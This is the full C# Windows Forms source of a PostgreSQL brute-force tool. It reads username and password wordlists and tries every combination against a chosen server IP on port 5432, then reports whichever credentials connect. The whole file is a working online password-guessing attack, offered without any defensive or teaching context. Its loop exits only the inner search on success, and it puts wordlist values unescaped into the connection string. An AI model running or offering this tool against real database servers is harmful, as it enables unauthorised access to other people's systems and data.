using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Npgsql;

namespace postgreSQLBruteForce
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
        }

        OpenFileDialog opf = new OpenFileDialog();
        private void USERNAMEBTTN_Click(object sender, EventArgs e)
        {
            try
            {
                opf.Title = "Choose wordlist for username";
                opf.Filter = "Text File | *.txt";
                opf.ShowDialog();
                string[] names = File.ReadAllLines(opf.FileName);
                foreach (string name in names)
                {
                    USERNAMLISTBX.Items.Add(name);
                }
            }
            catch (Exception)
            {
            }
        }
        private void PASSWORDBTTN_Click(object sender, EventArgs e)
        {
            try
            {
                opf.Title = "Choose wordlist for password";
                opf.Filter = "Text File | *.txt";
                opf.ShowDialog();
                string[] passwords = File.ReadAllLines(opf.FileName);
                foreach (string password in passwords)
                {
                    PASSWORDLISTBX.Items.Add(password);
                }
            }
            catch (Exception)
            {
            }
        }
        private void TRYBTTN_Click(object sender, EventArgs e)
        {
            string ip = SERVERIPTXTB.Text;
            string username = "not found";
            string password = "not found";

            foreach (string i in USERNAMLISTBX.Items)
            {
                foreach (string j in PASSWORDLISTBX.Items)
                {
                    try
                    {
                        string connectionString = "Server = " + ip + "; Port = 5432; User Id = " + i + "; Password = " + j + ";";
                        NpgsqlConnection conn = new NpgsqlConnection(connectionString);
                        conn.Open();
                        conn.Close();

                        username = i;
                        password = j;

                        break;
                    }
                    catch (Npgsql.NpgsqlException)
                    {
                    }
                    catch (System.Net.Sockets.SocketException)
                    {
                        MessageBox.Show("Server not found", "Server Error", MessageBoxButtons.OK);
                        break;
                    }
                }
            }
            MessageBox.Show("Server IP: " + ip + "\nUsername: " + username + "\nPassword: " + password, "Results", MessageBoxButtons.OK);

            USERNAMLISTBX.Items.Clear();
            PASSWORDLISTBX.Items.Clear();
        }

        private void SERVERIPTXTB_MouseEnter(object sender, EventArgs e)
        {
            if (SERVERIPTXTB.Text == "Server IP")
            {
                SERVERIPTXTB.Text = "";
                SERVERIPTXTB.ForeColor = Color.Black;
                SERVERIPTXTB.Focus();
            }
        }
        private void SERVERIPTXTB_MouseLeave(object sender, EventArgs e)
        {
            if (SERVERIPTXTB.Text == string.Empty)
            {
                SERVERIPTXTB.Text = "Server IP";
                SERVERIPTXTB.ForeColor = Color.Gray;
            }
        }
    }
}
